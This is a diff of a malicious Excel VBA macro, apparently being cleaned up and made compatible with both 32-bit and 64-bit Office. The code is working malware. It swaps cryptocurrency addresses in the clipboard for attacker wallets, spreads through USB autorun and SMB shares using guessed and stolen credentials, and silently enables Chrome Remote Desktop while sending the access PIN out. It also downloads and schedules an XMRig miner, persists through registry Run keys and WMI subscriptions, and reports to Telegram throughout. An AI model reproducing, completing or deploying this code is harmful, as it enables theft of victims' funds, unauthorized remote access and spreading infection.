-        Dim hData As LongPtr: hData = GetClipboardData(13): If hData Then Dim pData As LongPtr: pData = GlobalLock(hData)
-            If pData Then text = PointerToUnicodeString(pData): GlobalUnlock hData
+#If VBA7 Then
+        Dim hData As LongPtr, pData As LongPtr
+#Else
+        Dim hData As Long, pData As Long
+#End If
+        hData = GetClipboardData(13)
+        If hData Then
+            pData = GlobalLock(hData)
+            If pData Then
+                text = PointerToUnicodeString(pData)
+                GlobalUnlock hData
+            End If
         End If
-        If text = "" Then hData = GetClipboardData(1): If hData Then pData = GlobalLock(hData)
-            If pData Then text = PointerToAnsiString(pData): GlobalUnlock hData
-        End If: CloseClipboard
+        If text = "" Then
+            hData = GetClipboardData(1)
+            If hData Then
+                pData = GlobalLock(hData)
+                If pData Then
+                    text = PointerToAnsiString(pData)
+                    GlobalUnlock hData
+                End If
+            End If
+        End If
+        CloseClipboard
     End If
-    If text <> "" And text <> lastText Then lastText = text
-        If IsBTCAddress(text) Then SetClipboardContent BTC_WALLET: SendToTelegram "CLIPBOARD_SWAP|BTC|" & Left(text, 8) & "... -> " & Left(BTC_WALLET, 8) & "..."
-        ElseIf IsETHAddress(text) Then SetClipboardContent ETH_WALLET: SendToTelegram "CLIPBOARD_SWAP|ETH|" & Left(text, 8) & "... -> " & Left(ETH_WALLET, 8) & "..."
-        ElseIf IsXMRAddress(text) Then SetClipboardContent XMR_WALLET: SendToTelegram "CLIPBOARD_SWAP|XMR|" & Left(text, 8) & "... -> " & Left(XMR_WALLET, 8) & "..."
+    If text <> "" And text <> lastText Then
+        lastText = text
+        If IsBTCAddress(text) Then
+            SetClipboardContent BTC_WALLET
+            SendToTelegram "CLIPBOARD_SWAP|BTC|" & Left(text, 8) & "... -> " & Left(BTC_WALLET, 8) & "..."
+        ElseIf IsETHAddress(text) Then
+            SetClipboardContent ETH_WALLET
+            SendToTelegram "CLIPBOARD_SWAP|ETH|" & Left(text, 8) & "... -> " & Left(ETH_WALLET, 8) & "..."
+        ElseIf IsXMRAddress(text) Then
+            SetClipboardContent XMR_WALLET
+            SendToTelegram "CLIPBOARD_SWAP|XMR|" & Left(text, 8) & "... -> " & Left(XMR_WALLET, 8) & "..."
         End If
     End If
     Application.OnTime Now + TimeValue("00:00:00.5"), "ClipboardMonitorLoop"
 End Sub
 
-Private Function PointerToUnicodeString(ByVal pStr As LongPtr) As String
-    If pStr = 0 Then Exit Function: Dim lenStr As Long: lenStr = lstrlenW(pStr): If lenStr = 0 Then Exit Function
-    Dim buf As String: buf = String(lenStr, vbNullChar): CopyMemory ByVal StrPtr(buf), ByVal pStr, lenStr * 2: PointerToUnicodeString = buf
+#If VBA7 Then
+    Private Function PointerToUnicodeString(ByVal pStr As LongPtr) As String
+#Else
+    Private Function PointerToUnicodeString(ByVal pStr As Long) As String
+#End If
+    If pStr = 0 Then Exit Function
+    Dim lenStr As Long: lenStr = lstrlenW(pStr)
+    If lenStr = 0 Then Exit Function
+    Dim buf As String: buf = String(lenStr, vbNullChar)
+    CopyMemory ByVal StrPtr(buf), ByVal pStr, lenStr * 2
+    PointerToUnicodeString = buf
 End Function
 
-Private Function PointerToAnsiString(ByVal pStr As LongPtr) As String
-    If pStr = 0 Then Exit Function: Dim lenA As Long: lenA = lstrlenA(pStr): If lenA = 0 Then Exit Function
-    Dim wideLen As Long: wideLen = MultiByteToWideChar(CP_ACP, 0, pStr, lenA, 0, 0): If wideLen = 0 Then Exit Function
-    Dim buf As String: buf = String(wideLen, vbNullChar): MultiByteToWideChar CP_ACP, 0, pStr, lenA, StrPtr(buf), wideLen: PointerToAnsiString = buf
+#If VBA7 Then
+    Private Function PointerToAnsiString(ByVal pStr As LongPtr) As String
+#Else
+    Private Function PointerToAnsiString(ByVal pStr As Long) As String
+#End If
+    If pStr = 0 Then Exit Function
+    Dim lenA As Long: lenA = lstrlenA(pStr)
+    If lenA = 0 Then Exit Function
+    Dim wideLen As Long: wideLen = MultiByteToWideChar(CP_ACP, 0, pStr, lenA, 0, 0)
+    If wideLen = 0 Then Exit Function
+    Dim buf As String: buf = String(wideLen, vbNullChar)
+    MultiByteToWideChar CP_ACP, 0, pStr, lenA, StrPtr(buf), wideLen
+    PointerToAnsiString = buf
 End Function
 
 Private Function IsBTCAddress(addr As String) As Boolean
-    Dim regex As Object: Set regex = CreateObject("VBScript.RegExp"): regex.IgnoreCase = True: regex.Pattern = "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$": IsBTCAddress = regex.Test(addr)
+    Dim regex As Object: Set regex = CreateObject("VBScript.RegExp")
+    regex.IgnoreCase = True
+    regex.Pattern = "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$"
+    IsBTCAddress = regex.Test(addr)
 End Function
-Private Function IsETHAddress(addr As String) As Boolean: Dim regex As Object: Set regex = CreateObject("VBScript.RegExp"): regex.IgnoreCase = True: regex.Pattern = "^0x[a-fA-F0-9]{40}$": IsETHAddress = regex.Test(addr): End Function
-Private Function IsXMRAddress(addr As String) As Boolean: Dim regex As Object: Set regex = CreateObject("VBScript.RegExp"): regex.IgnoreCase = True: regex.Pattern = "^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$": IsXMRAddress = regex.Test(addr): End Function
+
+Private Function IsETHAddress(addr As String) As Boolean
+    Dim regex As Object: Set regex = CreateObject("VBScript.RegExp")
+    regex.IgnoreCase = True
+    regex.Pattern = "^0x[a-fA-F0-9]{40}$"
+    IsETHAddress = regex.Test(addr)
+End Function
+
+Private Function IsXMRAddress(addr As String) As Boolean
+    Dim regex As Object: Set regex = CreateObject("VBScript.RegExp")
+    regex.IgnoreCase = True
+    regex.Pattern = "^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$"
+    IsXMRAddress = regex.Test(addr)
+End Function
 
 Sub SetClipboardContent(txt As String)
-    On Error Resume Next: If OpenClipboard(0) = 0 Then Exit Sub: EmptyClipboard
-    Dim hMem As LongPtr: hMem = GlobalAlloc(&H42, (Len(txt) + 1) * 2): If hMem Then
-        Dim pMem As LongPtr: pMem = GlobalLock(hMem): If pMem Then CopyMemory ByVal pMem, ByVal StrPtr(txt), (Len(txt) + 1) * 2: GlobalUnlock hMem: SetClipboardData 13, hMem
+    On Error Resume Next
+    If OpenClipboard(0) = 0 Then Exit Sub
+    EmptyClipboard
+#If VBA7 Then
+    Dim hMem As LongPtr, pMem As LongPtr
+    Dim hMemAnsi As LongPtr, pMemAnsi As LongPtr
+#Else
+    Dim hMem As Long, pMem As Long
+    Dim hMemAnsi As Long, pMemAnsi As Long
+#End If
+    hMem = GlobalAlloc(&H42, (Len(txt) + 1) * 2)
+    If hMem Then
+        pMem = GlobalLock(hMem)
+        If pMem Then
+            CopyMemory ByVal pMem, ByVal StrPtr(txt), (Len(txt) + 1) * 2
+            GlobalUnlock hMem
+            SetClipboardData 13, hMem
+        End If
     End If
-    Dim ansiBytes() As Byte: ansiBytes = StrConv(txt, vbFromUnicode): Dim hMemAnsi As LongPtr: hMemAnsi = GlobalAlloc(&H42, UBound(ansiBytes) + 2)
-    If hMemAnsi Then Dim pMemAnsi As LongPtr: pMemAnsi = GlobalLock(hMemAnsi): If pMemAnsi Then CopyMemory ByVal pMemAnsi, ansiBytes(0), UBound(ansiBytes) + 1: GlobalUnlock hMemAnsi: SetClipboardData 1, hMemAnsi
-    End If: CloseClipboard
+    Dim ansiBytes() As Byte: ansiBytes = StrConv(txt, vbFromUnicode)
+    hMemAnsi = GlobalAlloc(&H42, UBound(ansiBytes) + 2)
+    If hMemAnsi Then
+        pMemAnsi = GlobalLock(hMemAnsi)
+        If pMemAnsi Then
+            CopyMemory ByVal pMemAnsi, ansiBytes(0), UBound(ansiBytes) + 1
+            GlobalUnlock hMemAnsi
+            SetClipboardData 1, hMemAnsi
+        End If
+    End If
+    CloseClipboard
 End Sub
 
 ' ============================================================
 ' 17. PROPAGATION (USB, SMB, NETWORK DRIVES, CLOUD, WMI)
 ' ============================================================
 Sub USBPropagation()
-    On Error Resume Next: Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject"): If Not fso.FileExists(gSelfPath) Then Exit Sub
-    Dim copiedAny As Boolean: copiedAny = False: Dim d As Object
-    For Each d In fso.Drives: If d.DriveType = 1 And d.IsReady Then
-        Dim root As String: root = d.DriveLetter & ":\": Dim dst As String: dst = root & "svch0st.xlsm"
-        fso.CopyFile gSelfPath, dst, True: SetAttr dst, vbHidden + vbSystem
-        Dim infPath As String: infPath = root & "autorun.inf"
-        Dim infFile As Object: Set infFile = fso.CreateTextFile(infPath, True)
-        infFile.WriteLine "[AutoRun]"
-        infFile.WriteLine "open=wscript.exe " & dst
-        infFile.WriteLine "action=Open folder to view files"
-        infFile.Close
-        SetAttr infPath, vbHidden + vbSystem
-        Dim sysFolder As String: sysFolder = root & "System Volume Information"
-        If Not fso.FolderExists(sysFolder) Then fso.CreateFolder sysFolder
-        SetAttr sysFolder, vbHidden + vbSystem: fso.CopyFile gSelfPath, sysFolder & "\svch0st.xlsm", True
-        Dim wsh As Object: Set wsh = CreateObject("WScript.Shell"): Dim shortcutPath As String: shortcutPath = root & "Important Documents.lnk"
-        Dim oLink As Object: Set oLink = wsh.CreateShortcut(shortcutPath): oLink.TargetPath = dst: oLink.Description = "Important Documents": oLink.Save
-        SendToTelegram "USB_PROPAGATED|" & d.DriveLetter: copiedAny = True
-    End If: Next
-    Dim net As Object: Set net = CreateObject("WScript.Network"): If Not net Is Nothing Then
-        Dim drives As Variant: drives = net.EnumNetworkDrives: Dim i As Integer
-        For i = 0 To drives.Count - 1 Step 2: Dim netDrive As String: netDrive = drives(i + 1)
+    On Error Resume Next
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FileExists(gSelfPath) Then Exit Sub
+    Dim copiedAny As Boolean: copiedAny = False
+    Dim d As Variant
+    For Each d In fso.Drives
+        If d.DriveType = 1 And d.IsReady Then
+            Dim root As String: root = d.DriveLetter & ":\"
+            Dim dst As String: dst = root & "svch0st.xlsm"
+            fso.CopyFile gSelfPath, dst, True
+            SetAttr dst, vbHidden + vbSystem
+            Dim infPath As String: infPath = root & "autorun.inf"
+            Dim infFile As Object: Set infFile = fso.CreateTextFile(infPath, True)
+            infFile.WriteLine "[AutoRun]"
+            infFile.WriteLine "open=wscript.exe " & dst
+            infFile.WriteLine "action=Open folder to view files"
+            infFile.Close
+            SetAttr infPath, vbHidden + vbSystem
+            Dim sysFolder As String: sysFolder = root & "System Volume Information"
+            If Not fso.FolderExists(sysFolder) Then fso.CreateFolder sysFolder
+            SetAttr sysFolder, vbHidden + vbSystem
+            fso.CopyFile gSelfPath, sysFolder & "\svch0st.xlsm", True
+            Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+            Dim shortcutPath As String: shortcutPath = root & "Important Documents.lnk"
+            Dim oLink As Object: Set oLink = wsh.CreateShortcut(shortcutPath)
+            oLink.TargetPath = dst
+            oLink.Description = "Important Documents"
+            oLink.Save
+            SendToTelegram "USB_PROPAGATED|" & d.DriveLetter
+            copiedAny = True
+        End If
+    Next d
+    Dim net As Object: Set net = CreateObject("WScript.Network")
+    If Not net Is Nothing Then
+        Dim drives As Variant: drives = net.EnumNetworkDrives
+        Dim i As Integer
+        For i = 0 To drives.Count - 1 Step 2
+            Dim netDrive As String: netDrive = drives(i + 1)
             If Right(netDrive, 1) <> "\" Then netDrive = netDrive & "\"
-            If fso.FolderExists(netDrive) Then fso.CopyFile gSelfPath, netDrive & "svch0st.xlsm", True: SetAttr netDrive & "svch0st.xlsm", vbHidden + vbSystem
-                SendToTelegram "NETWORK_DRIVE_PROPAGATED|" & drives(i) & " -> " & netDrive: copiedAny = True
-        Next
-    End If: If copiedAny Then g_usbPropagated = True Else SendToTelegram "USB_PROPAGATION_NO_TARGETS"
+            If fso.FolderExists(netDrive) Then
+                fso.CopyFile gSelfPath, netDrive & "svch0st.xlsm", True
+                SetAttr netDrive & "svch0st.xlsm", vbHidden + vbSystem
+                SendToTelegram "NETWORK_DRIVE_PROPAGATED|" & drives(i) & " -> " & netDrive
+                copiedAny = True
+            End If
+        Next i
+    End If
+    If copiedAny Then g_usbPropagated = True Else SendToTelegram "USB_PROPAGATION_NO_TARGETS"
 End Sub
 
 Private Function GetLocalNetworkIPs() As Collection
-    On Error Resume Next: Dim ips As New Collection: Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
-    Dim ipconfigFile As String: ipconfigFile = GetTempDir() & "ipconfig_" & Timer & ".txt": wsh.Run "cmd /c ipconfig > """ & ipconfigFile & """", 0, True: StealthSleep 2000
-    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject"): If Not fso.FileExists(ipconfigFile) Then Exit Function
-    Dim ts As Object: Set ts = fso.OpenTextFile(ipconfigFile, 1): Dim line As String, subnet As String
-    Do While Not ts.AtEndOfStream: line = ts.ReadLine
+    On Error Resume Next
+    Dim ips As New Collection
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    Dim ipconfigFile As String: ipconfigFile = GetTempDir() & "ipconfig_" & Timer & ".txt"
+    wsh.Run "cmd /c ipconfig > """ & ipconfigFile & """", 0, True
+    StealthSleep 2000
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FileExists(ipconfigFile) Then Exit Function
+    Dim ts As Object: Set ts = fso.OpenTextFile(ipconfigFile, 1)
+    Dim line As String, subnet As String
+    Do While Not ts.AtEndOfStream
+        line = ts.ReadLine
         If InStr(line, "IPv4 Address") > 0 Or InStr(line, "IP Address") > 0 Then
-            Dim parts As Variant: parts = Split(line, ":"): If UBound(parts) >= 1 Then
+            Dim parts As Variant: parts = Split(line, ":")
+            If UBound(parts) >= 1 Then
                 Dim ipAddress As String: ipAddress = Trim(parts(UBound(parts)))
                 If InStr(ipAddress, ".") > 0 And Not InStr(ipAddress, "127.0.0.1") > 0 Then
-                    Dim octets As Variant: octets = Split(ipAddress, "."): If UBound(octets) = 3 Then subnet = octets(0) & "." & octets(1) & "." & octets(2) & ".": Exit Do
+                    Dim octets As Variant: octets = Split(ipAddress, ".")
+                    If UBound(octets) = 3 Then
+                        subnet = octets(0) & "." & octets(1) & "." & octets(2) & "."
+                        Exit Do
+                    End If
                 End If
             End If
         End If
-    Loop: ts.Close: fso.DeleteFile ipconfigFile: If subnet = "" Then Exit Function
-    Dim i As Integer: For i = 1 To 254: On Error Resume Next: ips.Add subnet & i: Err.Clear: Next: Set GetLocalNetworkIPs = ips
+    Loop
+    ts.Close
+    fso.DeleteFile ipconfigFile
+    If subnet = "" Then Exit Function
+    Dim i As Integer
+    For i = 1 To 254
+        On Error Resume Next: ips.Add subnet & i: Err.Clear
+    Next i
+    Set GetLocalNetworkIPs = ips
 End Function
 
 Private Function IsPortOpen(ip As String, port As Integer) As Boolean
-    On Error Resume Next: Dim wsh As Object: Set wsh = CreateObject("WScript.Shell"): Dim psFile As String: psFile = GetTempDir() & "portcheck_" & Timer & ".ps1"
-    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject"): Dim f As Object: Set f = fso.CreateTextFile(psFile, True)
-    f.WriteLine "try {": f.WriteLine "  $test = Test-NetConnection -ComputerName '" & ip & "' -Port " & port & " -InformationLevel Quiet -ErrorAction Stop;"
-    f.WriteLine "  if ($test.TcpTestSucceeded) { Write-Output 'TRUE' } else { Write-Output 'FALSE' }": f.WriteLine "} catch { Write-Output 'FALSE' }": f.Close
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    Dim psFile As String: psFile = GetTempDir() & "portcheck_" & Timer & ".ps1"
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim f As Object: Set f = fso.CreateTextFile(psFile, True)
+    f.WriteLine "try {"
+    f.WriteLine "  $test = Test-NetConnection -ComputerName '" & ip & "' -Port " & port & " -InformationLevel Quiet -ErrorAction Stop;"
+    f.WriteLine "  if ($test.TcpTestSucceeded) { Write-Output 'TRUE' } else { Write-Output 'FALSE' }"
+    f.WriteLine "} catch { Write-Output 'FALSE' }"
+    f.Close
     Dim outFile As String: outFile = GetTempDir() & "portcheck_result_" & Timer & ".txt"
-    wsh.Run "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psFile & """ > """ & outFile & """", 0, True: StealthSleep 1000
-    If fso.FileExists(outFile) Then Dim ts As Object: Set ts = fso.OpenTextFile(outFile, 1): If Trim(ts.ReadAll) = "TRUE" Then IsPortOpen = True
-        ts.Close: fso.DeleteFile outFile
-    End If: fso.DeleteFile psFile
+    wsh.Run "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psFile & """ > """ & outFile & """", 0, True
+    StealthSleep 1000
+    If fso.FileExists(outFile) Then
+        Dim ts As Object: Set ts = fso.OpenTextFile(outFile, 1)
+        If Trim(ts.ReadAll) = "TRUE" Then IsPortOpen = True
+        ts.Close
+        fso.DeleteFile outFile
+    End If
+    fso.DeleteFile psFile
 End Function
 
 Private Sub CopyToRemoteWMI(targetIP As String, username As String, password As String)
@@ -1536,7 +2276,8 @@ Private Sub CopyToRemoteWMI(targetIP As String, username As String, password As 
         SendToTelegram "SMB_PROPAGATION_FAILED|" & targetIP & "|" & username & "|Error: " & Err.Description
         Err.Clear
     End If
-    On Error Resume Next: net.RemoveNetworkDrive share, True, True
+    On Error Resume Next
+    net.RemoveNetworkDrive share, True, True
 End Sub
 
 Private Sub CopyToRemote(targetIP As String, username As String, password As String)
@@ -1557,7 +2298,8 @@ Private Sub CopyToRemote(targetIP As String, username As String, password As Str
         SendToTelegram "SMB_PROPAGATION_FAILED|" & targetIP & "|" & username & "|Error: " & Err.Description
         Err.Clear
     End If
-    On Error Resume Next: net.RemoveNetworkDrive share, True, True
+    On Error Resume Next
+    net.RemoveNetworkDrive share, True, True
 End Sub
 
 Sub SMBPropagation()
@@ -1566,7 +2308,8 @@ Sub SMBPropagation()
     Dim out As String: out = wsh.Exec("cmd /c net view").StdOut.ReadAll
     Dim targets As New Collection
     If out <> "" And InStr(LCase(out), "no entries") = 0 Then
-        Dim lines As Variant: lines = Split(out, vbCrLf): Dim line As Variant
+        Dim lines As Variant: lines = Split(out, vbCrLf)
+        Dim line As Variant
         For Each line In lines
             If InStr(line, "\\") = 1 And InStr(line, " ") > 0 Then
                 Dim shareName As String: shareName = Trim(Left(line, InStr(line, " ") - 1))
@@ -1574,11 +2317,17 @@ Sub SMBPropagation()
             End If
         Next
     End If
-    Dim ips As Collection: Set ips = GetLocalNetworkIPs(): If Not ips Is Nothing Then Dim ip As Variant: For Each ip In ips
-        If IsPortOpen(ip, 445) Then On Error Resume Next: targets.Add ip, ip: Err.Clear: Next
+    Dim ips As Collection: Set ips = GetLocalNetworkIPs()
+    If Not ips Is Nothing Then
+        Dim ip As Variant
+        For Each ip In ips
+            If IsPortOpen(ip, 445) Then On Error Resume Next: targets.Add ip, ip: Err.Clear
+        Next
     End If
     If targets.Count = 0 Then SendToTelegram "SMB_PROPAGATION_NO_TARGETS": Exit Sub
-    Dim creds As New Collection: creds.Add "Administrator|", "admin_blank_pass": creds.Add Environ("USERNAME") & "|", "user_blank_pass"
+    Dim creds As New Collection
+    creds.Add "Administrator|", "admin_blank_pass"
+    creds.Add Environ("USERNAME") & "|", "user_blank_pass"
     On Error Resume Next: creds.Add ATTACKER_EMAIL & "|" & ATTACKER_PASSWORD, ATTACKER_EMAIL & "|" & ATTACKER_PASSWORD: Err.Clear
     If Not g_stolenCredentials Is Nothing Then
         Dim cred As Variant
@@ -1644,86 +2393,144 @@ End Sub
 ' 18. CHROME REMOTE DESKTOP & MINER
 ' ============================================================
 Sub EnableChromeRemoteDesktop()
-    On Error Resume Next: Dim crdPath As String: crdPath = Environ("ProgramFiles") & "\Google\Chrome Remote Desktop\chromoting.exe"
-    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject"): Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    On Error Resume Next
+    Dim crdPath As String: crdPath = Environ("ProgramFiles") & "\Google\Chrome Remote Desktop\chromoting.exe"
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     If Not fso.FileExists(crdPath) Then
         Dim installer As String: installer = GetTempDir() & "chromoting-setup.exe"
-        If RobustDownloadFile(CRD_DOWNLOAD_URL, installer, 3) Then wsh.Run """" & installer & """ /install", 0, True: StealthSleep 10000
+        If RobustDownloadFile(CRD_DOWNLOAD_URL, installer, 3) Then wsh.Run """" & installer & """ /install", 0, True
+        StealthSleep 10000
     End If
     If Not fso.FileExists(crdPath) Then SendToTelegram "CRD_INSTALL_FAILED": Exit Sub
-    Dim pin As String: pin = Format(Int(Rnd * 999999) + 1, "000000"): wsh.Run """" & crdPath & """ --start-host --pin=" & pin, 0, True: StealthSleep 5000
-    Dim cmd As String: cmd = """" & crdPath & """ --get-host-id": Dim exec As Object: Set exec = wsh.Exec(cmd)
-    Do While exec.Status = 0: StealthSleep 100: Loop: Dim id As String: id = Trim(exec.StdOut.ReadAll)
-    If id <> "" Then SendToTelegram "CRD_ENABLED|ID=" & id & "|PIN=" & pin & "|MACHINE=" & GetMachineID()
-    Else SendToTelegram "CRD_GET_ID_FAILED"
+    Dim pin As String: pin = Format(Int(Rnd * 999999) + 1, "000000")
+    wsh.Run """" & crdPath & """ --start-host --pin=" & pin, 0, True
+    StealthSleep 5000
+    Dim cmd As String: cmd = """" & crdPath & """ --get-host-id"
+    Dim exec As Object: Set exec = wsh.Exec(cmd)
+    Do While exec.Status = 0: StealthSleep 100: Loop
+    Dim id As String: id = Trim(exec.StdOut.ReadAll)
+    If id <> "" Then
+        SendToTelegram "CRD_ENABLED|ID=" & id & "|PIN=" & pin & "|MACHINE=" & GetMachineID()
+    Else
+        SendToTelegram "CRD_GET_ID_FAILED"
+    End If
 End Sub
 
 Sub DeployMiner()
-    On Error Resume Next: Dim urls As Variant: urls = Array(MINER_URL1, MINER_URL2, MINER_URL3): Dim url As Variant
-    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject"): Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
-    Dim minerDir As String: minerDir = Environ("PROGRAMDATA") & "\XMRigService\": If Not fso.FolderExists(minerDir) Then fso.CreateFolder minerDir: SetAttr minerDir, vbHidden + vbSystem
-    For Each url In urls: Dim dest As String: dest = minerDir & fso.GetFileName(url)
+    On Error Resume Next
+    Dim urls As Variant: urls = Array(MINER_URL1, MINER_URL2, MINER_URL3)
+    Dim url As Variant
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    Dim minerDir As String: minerDir = Environ("PROGRAMDATA") & "\XMRigService\"
+    If Not fso.FolderExists(minerDir) Then fso.CreateFolder minerDir
+    SetAttr minerDir, vbHidden + vbSystem
+    For Each url In urls
+        Dim dest As String: dest = minerDir & fso.GetFileName(url)
         If RobustDownloadFile(url, dest, 3) Then
             If LCase(fso.GetExtensionName(dest)) = "zip" Then
-                Dim extractDir As String: extractDir = minerDir & "xmrig_extracted\": If Not fso.FolderExists(extractDir) Then fso.CreateFolder extractDir
-                Dim shellApp As Object: Set shellApp = CreateObject("Shell.Application"): Dim zipFolder As Object: Set zipFolder = shellApp.NameSpace(dest)
-                For Each file In zipFolder.Items: shellApp.NameSpace(extractDir).CopyHere file, &H10: Next
+                Dim extractDir As String: extractDir = minerDir & "xmrig_extracted\"
+                If Not fso.FolderExists(extractDir) Then fso.CreateFolder extractDir
+                Dim shellApp As Object: Set shellApp = CreateObject("Shell.Application")
+                Dim zipFolder As Object: Set zipFolder = shellApp.NameSpace(dest)
+                Dim file As Variant
+                For Each file In zipFolder.Items
+                    shellApp.NameSpace(extractDir).CopyHere file, &H10
+                Next
                 Dim exePath As String: exePath = extractDir & "xmrig.exe"
-                If Not fso.FileExists(exePath) Then Dim subFolders As Object: Set subFolders = fso.GetFolder(extractDir).SubFolders: Dim sF As Object
-                    For Each sF In subFolders: If fso.FileExists(sF.Path & "\xmrig.exe") Then exePath = sF.Path & "\xmrig.exe": Exit For: Next
+                If Not fso.FileExists(exePath) Then
+                    Dim subFolders As Object: Set subFolders = fso.GetFolder(extractDir).SubFolders
+                    Dim sF As Variant
+                    For Each sF In subFolders
+                        If fso.FileExists(sF.Path & "\xmrig.exe") Then
+                            exePath = sF.Path & "\xmrig.exe"
+                            Exit For
+                        End If
+                    Next
                 End If
-                If fso.FileExists(exePath) Then Dim taskName As String: taskName = "XMRigScheduler"
+                If fso.FileExists(exePath) Then
+                    Dim taskName As String: taskName = "XMRigScheduler"
                     Dim command As String: command = """" & exePath & """ -o pool.minexmr.com:443 -u " & XMR_WALLET & " -p x --donate-level 1 --background"
                     wsh.Run "schtasks /create /tn """ & taskName & """ /tr """ & command & """ /sc onlogon /f", 0, True
-                    wsh.Run "schtasks /run /tn """ & taskName & """", 0, True: SendToTelegram "MINER_DEPLOYED|" & url: Exit Sub
+                    wsh.Run "schtasks /run /tn """ & taskName & """", 0, True
+                    SendToTelegram "MINER_DEPLOYED|" & url
+                    Exit Sub
                 End If
             ElseIf LCase(fso.GetExtensionName(dest)) = "exe" Or LCase(fso.GetExtensionName(dest)) = "bat" Then
-                Dim taskName As String: taskName = "XMRigScheduler": Dim command As String: command = """" & dest & """ -o pool.minexmr.com:443 -u " & XMR_WALLET & " -p x --donate-level 1 --background"
+                Dim taskName As String: taskName = "XMRigScheduler"
+                Dim command As String: command = """" & dest & """ -o pool.minexmr.com:443 -u " & XMR_WALLET & " -p x --donate-level 1 --background"
                 wsh.Run "schtasks /create /tn """ & taskName & """ /tr """ & command & """ /sc onlogon /f", 0, True
-                wsh.Run "schtasks /run /tn """ & taskName & """", 0, True: SendToTelegram "MINER_DEPLOYED|" & url: Exit Sub
+                wsh.Run "schtasks /run /tn """ & taskName & """", 0, True
+                SendToTelegram "MINER_DEPLOYED|" & url
+                Exit Sub
             End If
         End If
-    Next: SendToTelegram "MINER_FAILED"
+    Next
+    SendToTelegram "MINER_FAILED"
 End Sub
 
 ' ============================================================
 ' 19. PERSISTENCE (STANDARD + ADVANCED)
 ' ============================================================
 Sub InstallPermanentCopy()
-    On Error Resume Next: Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject"): Dim hiddenPath As String: hiddenPath = Environ("PROGRAMDATA") & "\Lazarus\"
-    If Not fso.FolderExists(hiddenPath) Then fso.CreateFolder hiddenPath: SetAttr hiddenPath, vbHidden + vbSystem
-    Dim dest As String: dest = hiddenPath & "Lazarus.xlsm": fso.CopyFile gSelfPath, dest, True: SetAttr dest, vbHidden + vbSystem: gSelfPath = dest
+    On Error Resume Next
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim hiddenPath As String: hiddenPath = Environ("PROGRAMDATA") & "\Lazarus\"
+    If Not fso.FolderExists(hiddenPath) Then fso.CreateFolder hiddenPath
+    SetAttr hiddenPath, vbHidden + vbSystem
+    Dim dest As String: dest = hiddenPath & "Lazarus.xlsm"
+    fso.CopyFile gSelfPath, dest, True
+    SetAttr dest, vbHidden + vbSystem
+    gSelfPath = dest
 End Sub
 
 Sub PersistRegistry()
-    On Error Resume Next: Dim wsh As Object: Set wsh = CreateObject("WScript.Shell"): wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateCore", """" & gSelfPath & """", "REG_SZ"
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateCore", """" & gSelfPath & """", "REG_SZ"
     wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\UpdateCheck", """" & gSelfPath & """", "REG_SZ"
 End Sub
 
 Sub PersistWMI()
-    On Error Resume Next: Dim psScript As String: psScript = "$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{Name='LazarusFilter'; EventNamespace='Root\CimV2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\" AND TargetInstance.Name = \"_Total\"'};" & vbCrLf & _
+    On Error Resume Next
+    Dim psScript As String: psScript = "$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{Name='LazarusFilter'; EventNamespace='Root\CimV2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\" AND TargetInstance.Name = \"_Total\"'};" & vbCrLf & _
                "$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{Name='LazarusConsumer'; CommandLineTemplate='""excel.exe"" """ & gSelfPath & """'};" & vbCrLf & _
                "Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$filter; Consumer=$consumer}"
-    Dim psFile As String: psFile = GetTempDir() & "wmi_" & Timer & ".ps1": Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
-    Dim f As Object: Set f = fso.CreateTextFile(psFile, True): f.Write psScript: f.Close
-    CreateObject("WScript.Shell").Run "powershell -ep bypass -File """ & psFile & """", 0, True: StealthSleep 3000: fso.DeleteFile psFile
+    Dim psFile As String: psFile = GetTempDir() & "wmi_" & Timer & ".ps1"
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim f As Object: Set f = fso.CreateTextFile(psFile, True)
+    f.Write psScript
+    f.Close
+    CreateObject("WScript.Shell").Run "powershell -ep bypass -File """ & psFile & """", 0, True
